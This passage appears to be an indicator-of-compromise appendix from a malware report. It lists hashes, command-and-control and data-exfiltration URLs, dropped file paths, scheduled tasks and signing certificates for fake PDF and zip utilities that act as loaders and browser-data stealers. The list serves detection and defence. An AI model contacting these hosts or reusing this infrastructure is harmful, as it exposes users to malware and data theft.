url                  https://pwrtail.com/update/auth                                   PDF Skills updater C2 authentication endpoint
url                  https://pwrtail.com/update/download                               PDF Skills updater C2 payload download endpoint
url                  https://cbn.skillcli.com/r                                        PDF Skills updater telemetry exfiltration endpoint
filepath             %APPDATA%\PDFSkills\skillsUserId.txt                              PDF Skills updater persistent user ID file read
filepath             %LOCALAPPDATA%\PDFSkills\skillsUserId.txt                         PDF Skills updater alternate user ID file location
filepath             %APPDATA%\PDFSkills\PDFSkillsApp.exe                              PDF Skills updater installation date source
filepath             %APPDATA%\PDFSkills                                               PDF Skills updater application data folder
filepath             Update.exe                                                        PDF Skills updater managed loader binary
filepath             Update.dll                                                        PDF Skills updater native/mixed-mode loader DLL
sha256               a8df2614154fb621c8e63df63d6aa9251eb6f184151d118a60b0dc902a4bd021  Rapid Doc updater (HibbyRAT) RapiddocUpdater.exe
domain               segataw.com                                                       Rapid Doc updater C2 domain
url                  https://segataw.com/                                              Rapid Doc updater base C2 URL
url                  https://segataw.com/auth_product                                  Rapid Doc updater authentication beacon endpoint
url                  https://segataw.com/gupdate                                       Rapid Doc updater encrypted payload delivery endpoint
url                  https://segataw.com/product_report                                Rapid Doc updater telemetry reporting endpoint
filepath             %LOCALAPPDATA%\Rapidoc\                                           Rapid Doc updater persistence directory
filepath             %LOCALAPPDATA%\Rapidoc\rapidoc-file.txt                           Rapid Doc updater GUID fingerprint file
sha256               84459f055a271cf9229ff0aa82981b47a2870f1ea6307a6078a30ae67eae1762  Zap PDF installer (Zapdf.exe)
domain               alexinok.com                                                      Zap PDF installer C2 domain
domain               zappdfapp.com                                                     Zap PDF installer product website (EULA/privacy)
url                  https://alexinok.com/hwmi                                         Zap PDF installer C2 configuration fetch endpoint
url                  https://alexinok.com/agg                                          Zap PDF installer telemetry exfiltration endpoint
url                  https://alexinok.com/Zp2s                                         Zap PDF installer Chrome detection signal endpoint
url                  https://alexinok.com/zpdfupd                                      Zap PDF installer updater download endpoint (base64 ZIP)
url                  https://www.zappdfapp.com/zap-eula?                               Zap PDF installer EULA page
url                  https://www.zappdfapp.com/zap-privacy?                            Zap PDF installer privacy policy page
filepath             %LOCALAPPDATA%\Zapdf\                                             Zap PDF installer install directory
filepath             %LOCALAPPDATA%\Zapdf\Zapdf.exe                                    Zap PDF installer main application dropped
filepath             %LOCALAPPDATA%\Zapdf\Zapdf_txt.txt                                Zap PDF installer user ID (GUID) file
filepath             %LOCALAPPDATA%\Zapdf\ZapUpdater\ZapUpdater.exe                    Zap PDF installer downloaded updater binary
filepath             %LOCALAPPDATA%\Zapdf\extract                                      Zap PDF installer temp base64-decoded ZIP path
filepath             %DESKTOP%\Zapdf.lnk                                               Zap PDF installer desktop shortcut
scheduled_task       Zapdf                                                             Zap PDF installer daily persistence scheduled task (runs ZapUpdater.exe)
sha256               912479bf09b5c7454ac6c052e539c30924454ad1129861bf7e16f48eeee733ef  Zap PDF updater ZapUpdater.exe main loader
sha256               e1e27af7b07eeedf5ce71a9255f0422816a6fc5849a483c6714e1b472044fa9d  Zap PDF updater embedded Newtonsoft.Json.dll (legitimate dependency)
domain               domenget.com                                                      Zap PDF updater C2 domain
url                  https://domenget.com/                                             Zap PDF updater C2 base URL
url                  https://domenget.com/login                                        Zap PDF updater C2 login endpoint
url                  https://domenget.com/post                                         Zap PDF updater C2 payload download endpoint
url                  https://domenget.com/pdata                                        Zap PDF updater C2 metrics telemetry endpoint
filepath             %LOCALAPPDATA%\Application\config.dat                             Zap PDF updater formatted timestamp storage
filepath             %LOCALAPPDATA%\Zapdf\Zapdf_txt.txt                                Zap PDF updater persistent victim GUID file
filepath             %LOCALAPPDATA%\Zapdf\                                             Zap PDF updater created directory
filepath             %LOCALAPPDATA%\Application\                                       Zap PDF updater created directory
sha256               2014c84faf5d71a5a5cc77713e136e1ebe789565aa12ce0731a8add53bca078f  ZipThis installer main binary
domain               apb.thisilient.com                                                ZipThis installer C2 config subdomain
domain               can.thisilient.com                                                ZipThis installer C2 telemetry subdomain
domain               sts.thisilient.com                                                ZipThis installer conversion tracking subdomain
domain               www.zipthisapp.com                                                ZipThis installer product domain
domain               visit.keyguardai.com                                              ZipThis installer affiliate domain
url                  https://apb.thisilient.com/v6                                     ZipThis installer C2 configuration retrieval (XOR-encrypted)
url                  https://can.thisilient.com/r                                      ZipThis installer telemetry exfiltration (XOR-encrypted)
url                  https://sts.thisilient.com/st                                     ZipThis installer conversion tracking pixel
url                  "https://visit.keyguardai.com/click?pid=496&offer_id=14039178"    ZipThis installer KeyGuard AI affiliate URL
url                  https://www.zipthisapp.com/success?u=<GUID>                       ZipThis installer post-install success page
url                  https://www.zipthisapp.com/see-you-later                          ZipThis installer uninstall page
certificate.subject  LIGHTNER TOK LTD                                                  ZipThis installer code signing cert subject
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                         ZipThis installer code signing cert issuer
certificate.serial   4469809aa0e206829c99cd18                                          ZipThis installer code signing cert serial (expired 2025-02-21)
filepath             <InstallDir>\Updater.exe                                          ZipThis installer dropped persistent updater/loader
filepath             <InstallDir>\ZipThisApp.exe                                       ZipThis installer dropped main app
filepath             <InstallDir>\Uninstall.exe                                        ZipThis installer dropped uninstaller
filepath             <InstallDir>\update_task.ps1                                      ZipThis installer dropped non-admin scheduled task script
filepath             <InstallDir>\update_task_ad.ps1                                   ZipThis installer dropped admin scheduled task script
filepath             <InstallDir>\zipthisUserId.txt                                    ZipThis installer persistent user ID file
filepath             %APPDATA%\SMCR\userId.txt                                         ZipThis installer shared backup user ID (cross-product with PDFSkills)
filepath             %DESKTOP%\ZipThisApp.lnk                                          ZipThis installer desktop shortcut
filepath             ziptest.txt                                                       ZipThis installer test-run indicator file
filepath             %APPDATA%\ZipThis\                                                ZipThis installer admin install folder
filepath             %LOCALAPPDATA%\ZipThis\                                           ZipThis installer non-admin install folder
filepath             Updates.zip                                                       ZipThis installer embedded payload archive (contains Updater.exe)
scheduled_task       UpdateTaskZT                                                      ZipThis installer daily scheduled task running Updater.exe
sha256               cbdfe04b8f754e5e6150936ee604f0a478b79c6d0466ee155775ead575adea90  ZipThis updater Updater.exe managed stub
sha256               27a7ba032f7d6cf787454c2fd036c95d13be9fb489b26fd9050659aa23498dd6  ZipThis updater Updater.dll native loader
domain               tzpdld.com                                                        ZipThis updater primary C2 domain
domain               can.thisilient.com                                                ZipThis updater telemetry C2 domain
url                  https://tzpdld.com/update/auth                                    ZipThis updater C2 authentication endpoint
url                  https://tzpdld.com/update/download                                ZipThis updater C2 payload download endpoint
url                  https://can.thisilient.com/r                                      ZipThis updater telemetry exfiltration endpoint
certificate.subject  LIGHTNER TOK LTD                                                  ZipThis updater Updater.exe code-signing certificate subject (EV GlobalSign expired 2025-02-21)
certificate.serial   4469809aa0e206829c99cd18                                          ZipThis updater Updater.exe code-signing certificate serial
filepath             %APPDATA%\ZipThis\zipthisUserId.txt                               ZipThis updater persistent user ID file read
filepath             %LOCALAPPDATA%\ZipThis\zipthisUserId.txt                          ZipThis updater alternate user ID file location
filepath             %APPDATA%\ZipThis\ZipThisApp.exe                                  ZipThis updater installation date timestamp source
filepath             Updater.exe                                                       ZipThis updater managed stub binary
filepath             Updater.dll                                                       ZipThis updater native loader DLL
```

### Hollow Mare

```
type                 value                                                                               comment                                                                                
sha256               287a3a052ff0b2c495658fa90c5a9bd76f16d832d82138f6f8e87f9e2f578ab1                    SagePDF installer file hash                                                            
domain               ralogoto.com                                                                        SagePDF installer C2 domain                                                            
url                  https://ralogoto.com/SGP                                                            SagePDF installer C2 config URL                                                        
url                  https://ralogoto.com/SGPD                                                           SagePDF installer C2 telemetry URL                                                     
certificate.subject  Chrono Orion LTD                                                                    SagePDF installer code-signing certificate subject                                     
certificate.issuer   Sectigo Public Code Signing CA EV R36                                               SagePDF installer code-signing certificate issuer                                      
certificate.serial   009c2bafbcb665dc15d00e2767278e1656                                                  SagePDF installer code-signing certificate serial                                      
filepath             %TEMP%\SagePdf\SageId.txt                                                           SagePDF installer user ID file                                                         
filepath             %TEMP%\UID\UID.txt                                                                  SagePDF installer legacy user ID file                                                  
filepath             %TEMP%\Sage.Files.Pron.ico                                                          SagePDF installer dropped icon file                                                    
filepath             %USERPROFILE%\Desktop\<AppNick>.lnk                                                 SagePDF installer dropped desktop shortcut                                             
sha256               9ee6348755a9162f52d79a9ddac460d35f071cbe5bf074d8e88a3c6d07cd8af9                    SagePDF Stage 2 encrypted resource Sage.Resources.MainProcessLib.enc                   
sha256               c0c7640bab371f198a6bbe58e1cfb124877eb73e27084f66e0d35ae2ed47c650                    SagePDF Stage 2 decrypted MainProcessLib.dll                                           
filepath             C:\Git\v4_application\V4_Application\MainProcessLib\obj\Release\MainProcessLib.pdb  SagePDF Stage 2 PDB build path from MainProcessLib.dll                                 
certificate.subject  Chrono Orion LTD                                                                    SagePDF Stage 2 code signing certificate subject (Israel)                              
sha256               3d82200083a86df09c3b16c9095b844738a76863b1b01092b6c4dbef3b974b12                    ConvertyFile stealer/browser extension installer (BanditStealer)                       
domain               olienti.com                                                                         ConvertyFile C2 server                                                                 
domain               convertyfileapp.com                                                                 ConvertyFile fake product website                                                      
url                  https://olienti.com/vars                                                            ConvertyFile C2 victim registration endpoint                                           
url                  https://olienti.com/pass                                                            ConvertyFile C2 data exfiltration endpoint                                             
url                  https://olienti.com/boom                                                            ConvertyFile C2 success reporting endpoint                                             
url                  https://www.convertyfileapp.com/converty-thank-you                                  ConvertyFile post-install redirect (thank-you page)                                    
certificate.subject  "TAU CENTAURI LTD                                                                    Central District                                                      Ra'anana   IL"  ConvertyFile code-signing certificate subject
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                                           ConvertyFile code-signing certificate issuer                                           
certificate.serial   115d73560ce2dd101d5bd925                                                            ConvertyFile code-signing certificate serial                                           
filepath             %TEMP%\ConvertyFile\CFInfo.txt                                                      ConvertyFile dropped persistent victim UUID file                                       
filepath             %TEMP%\ConvertyFile\favicon.ico                                                     ConvertyFile dropped extracted icon                                                    
filepath             %TEMP%\ConvertyFile\uninstall.exe                                                   ConvertyFile dropped extracted uninstaller                                             
filepath             %USERPROFILE%\Desktop\ConvertyFile.lnk                                              ConvertyFile created desktop shortcut (persistence)                                    
sha256               598da788600747cf3fa1f25cb4fa1e029eca1442316709c137690e645a0872bb                    CrystalPDF stealer/installer main binary                                               
sha256               0f76f6a9f7c2575f9312953d37b51a8e1a7cc38a0758e272deef25bd6593306e                    CrystalPDF embedded decoy payload Crystal PDF.exe                                      
domain               strongdwn.com                                                                       CrystalPDF primary C2 (data theft + telemetry)                                         
domain               negmari.com                                                                         CrystalPDF attribution/tracking server                                                 
domain               cnvr.windwn.com                                                                     CrystalPDF embedded payload conversion API                                             
url                  https://strongdwn.com/initiate                                                      CrystalPDF session initialization                                                      
url                  https://strongdwn.com/convert                                                       CrystalPDF Firefox data exfiltration                                                   
url                  https://strongdwn.com/merge                                                         CrystalPDF Chrome data exfiltration                                                    
url                  https://strongdwn.com/abg                                                           CrystalPDF telemetry reporting                                                         
url                  https://negmari.com/Cry                                                             CrystalPDF visit info / campaign attribution                                           
url                  https://negmari.com/st                                                              CrystalPDF event notification                                                          
url                  https://cnvr.windwn.com/api                                                         CrystalPDF embedded payload PDF conversion API                                         
certificate.subject  VAST LAKE LTD                                                                       CrystalPDF outer binary code-signing cert subject                                      
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                                           CrystalPDF outer binary code-signing cert issuer                                       
certificate.serial   032a466477d8c628044fd4b6                                                            CrystalPDF outer binary code-signing cert serial                                       
certificate.subject  LONG SOUND LTD                                                                      CrystalPDF embedded payload code-signing cert subject                                  
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                                           CrystalPDF embedded payload code-signing cert issuer                                   
certificate.serial   56ed9a94b87a7231b56f6a02                                                            CrystalPDF embedded payload code-signing cert serial                                   
filepath             %AppData%\FMCR\userId.txt                                                           CrystalPDF victim ID persistence file                                                  
filepath             %AppData%\FMCR\                                                                     CrystalPDF malware data directory                                                      
filepath             %AppData%\file_backup.txt                                                           CrystalPDF Firefox data theft transient backup                                         
filepath             %AppData%\myfile_backup.txt                                                         CrystalPDF Chrome data theft transient backup                                          
filepath             %LocalAppData%\temp\crys\CrystalPDF.exe                                             CrystalPDF staged malware copy for scheduled task persistence                          
filepath             %Desktop%\Crystal PDF.exe                                                           CrystalPDF dropped decoy/benign payload on Desktop                                     
filepath             %USERPROFILE%\Downloads\*.pdf                                                       CrystalPDF embedded payload output auto-opened                                         
scheduled_task       Crystal_updater                                                                     CrystalPDF daily persistence task running updater role                                 
sha256               e8b89b9fc60dc8ddb861369a7ab2cc319f23495022c4d1feb6e0cc4f3a87214c                    OneZip installer/stealer (BanditStealer)                                               
domain               oneoni.com                                                                          OneZip primary C2 telemetry                                                            
domain               zalp.oneoni.com                                                                     OneZip secondary C2 session/data theft                                                 
url                  https://oneoni.com/oz-st                                                            OneZip initial check-in (SendVS)                                                       
url                  https://oneoni.com/oz-rep                                                           OneZip telemetry report (SendMap)                                                      
url                  https://zalp.oneoni.com/start                                                       OneZip session initiation                                                              
url                  https://zalp.oneoni.com/                                                            OneZip stealer exfiltration endpoint                                                   
certificate.subject  G.R.CIGAR. LTD                                                                      OneZip code signing subject (IL Herzliya)                                              
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                                           OneZip code signing issuer                                                             
certificate.serial   11776a855f0ee7dbe11e08e1                                                            OneZip code signing serial                                                             
filepath             %TEMP%\O\OZInfo.txt                                                                 OneZip persistent victim UUID file                                                     
filepath             %TEMP%\onezip\uninstall.exe                                                         OneZip installation marker                                                             
filepath             %LOCALAPPDATA%\Temp\onezip\uninstall.exe                                            OneZip installation marker (alt)                                                       
filepath             %USERPROFILE%\Desktop\OneZip.lnk                                                    OneZip desktop shortcut persistence                                                    
filepath             file_backup.txt                                                                     OneZip backup of stolen Firefox profile file                                           
sha256               cb42e3a751ff526912bb41337a9205cbe145f5fe80869341c79d5358c863c549                    PDFDoc installer/adware main binary                                                    
domain               cliedoc.com                                                                         PDFDoc installer C2 domain                                                             
domain               bolb.cliedoc.com                                                                    PDFDoc installer C2 subdomain                                                          
url                  https://bolb.cliedoc.com/PDoc                                                       PDFDoc installer C2 config endpoint                                                    
certificate.subject  TAMARISK INTERACTIVE LTD                                                            PDFDoc installer code-signing cert subject                                             
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                                           PDFDoc installer code-signing cert issuer                                              
certificate.serial   58ef7daed3c6f44b1339b5f3                                                            PDFDoc installer code-signing cert serial                                              
filepath             %DESKTOP%\PDFDoc.lnk                                                                PDFDoc installer dropped desktop shortcut                                              
filepath             %TEMP%\Doc.Files.Pron.ico                                                           PDFDoc installer dropped shortcut icon                                                 
filepath             %TEMP%\DocID\DocID.txt                                                              PDFDoc installer dropped machine GUID file                                             
filepath             %TEMP%\...\UID.txt                                                                  PDFDoc installer dropped machine identifier file                                       
sha256               865e689218d52d0d179659c1a9929231f9f4af0738835f768aff4242818b5a02                    PowerDoc installer                                                                     
sha256               84f4a3abbda52c9e4cda6232d05d0b07406f6b4f2c2432cc34b153a663eb20bb                    PowerDoc dropped native.exe (cover app)                                                
sha256               136876316fa5da917ab4d3b5b694dff98250d9f6b2151660a2b558bea870b0c0                    PowerDoc dropped uninstall.exe                                                         
domain               ulinikio.com                                                                        PowerDoc primary C2                                                                    
domain               lmbd.ulinikio.com                                                                   PowerDoc data exfiltration C2                                                          
domain               itayh.ulinikio.com                                                                  PowerDoc API for native.exe                                                            
domain               www.getpowerdoc.com                                                                 PowerDoc fake product website                                                          
domain               getpowerdoc.com                                                                     PowerDoc uninstall redirect                                                            
url                  https://ulinikio.com/SlaPwrV                                                        PowerDoc installer config fetch                                                        
url                  https://ulinikio.com/SlaPwrLog                                                      PowerDoc installer telemetry exfil                                                     
url                  https://ulinikio.com/SlaPwrSuc                                                      PowerDoc installer success beacon                                                      
url                  https://lmbd.ulinikio.com/run                                                       PowerDoc installer session init                                                        
url                  https://lmbd.ulinikio.com/docMSlav                                                  PowerDoc installer data exfil                                                          
url                  https://itayh.ulinikio.com/powerdoc/                                                PowerDoc native.exe PDF API                                                            
url                  https://www.getpowerdoc.com/powerd-welcome                                          PowerDoc installer post-install welcome page                                           
url                  https://getpowerdoc.com/powerd-goodbye                                              PowerDoc uninstaller goodbye page                                                      
certificate.subject  GOLD HARMONY LTD                                                                    PowerDoc installer/dropper signing cert subject                                        
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                                           PowerDoc installer/dropper signing cert issuer                                         
certificate.serial   4a6df66704fbd9b656c11ab6                                                            PowerDoc installer/dropper signing cert serial                                         
filepath             %LocalAppData%\pwrDoc\PowerDoc.exe                                                  PowerDoc dropped cover application                                                     
filepath             %LocalAppData%\pwrDoc\uninstall.exe                                                 PowerDoc dropped uninstaller                                                           
filepath             %LocalAppData%\pwrDoc\PowerDocIco.ico                                               PowerDoc dropped icon                                                                  
filepath             %LocalAppData%\pwrDoc\pwrDoc.txt                                                    PowerDoc machine GUID persistence file                                                 
filepath             %AppData%\myfile_backup.txt                                                         PowerDoc transient backup during browser file replacement                              
filepath             %Desktop%\PowerDoc.lnk                                                              PowerDoc installer desktop shortcut                                                    
sha256               cf1ea5d89495986f22cda4b87170a97afecc662293554b15493c11a1520153d6                    PowerPlayer installer                                                                  
domain               kolimau.com                                                                         PowerPlayer installer C2                                                               
domain               haha.kolimau.com                                                                    PowerPlayer installer payload delivery                                                 
url                  https://kolimau.com/PowerPlayer-strings                                             PowerPlayer installer C2 config fetch                                                  
url                  https://kolimau.com/PowerPlayer                                                     PowerPlayer installer telemetry exfil                                                  
url                  https://kolimau.com/Conv                                                            PowerPlayer installer conversion tracking                                              
url                  https://haha.kolimau.com/api/action/PowerPlayerLatestVersion                        PowerPlayer installer payload download                                                 
certificate.subject  TAMARISK INTERACTIVE LTD                                                            PowerPlayer installer code-signing cert subject                                        
certificate.issuer   GlobalSign GCC R45 EV CodeSigning CA 2020                                           PowerPlayer installer code-signing cert issuer                                         
certificate.serial   32650e4c7423c72bda9565bf                                                            PowerPlayer installer code-signing cert serial                                         
filepath             %TEMP%\PwrId\PwrId.txt                                                              PowerPlayer installer persistent victim GUID                                           
filepath             %TEMP%\PowerPlayer.zip                                                              PowerPlayer installer downloaded payload archive                                       
filepath             %TEMP%\PowerPlayer\NativePowerPlayer.exe                                            PowerPlayer installer extracted companion binary                                       
filepath             %TEMP%\PowerPlayer\UninstallPP.exe                                                  PowerPlayer installer uninstaller                                                      
filepath             %USERPROFILE%\Desktop\PowerPlayer.lnk                                               PowerPlayer installer desktop shortcut                                                 
```
